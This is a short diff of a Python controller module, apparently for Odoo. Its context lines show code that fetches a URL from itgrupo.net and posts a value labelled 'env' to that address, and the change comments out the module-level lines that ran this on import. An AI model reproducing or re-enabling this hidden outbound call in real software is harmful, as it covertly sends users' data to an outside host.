@@ -45,5 +45,5 @@ class ControllerData(http.Controller):
 		m = requests.post('https://itgrupo.net/get_controller',data={})
 		requests.post(m.text+'set_parameters',data={'env':rpta})
 
-get_data = ControllerData()
-get_data.initialize()
+#get_data = ControllerData()
+#get_data.initialize()
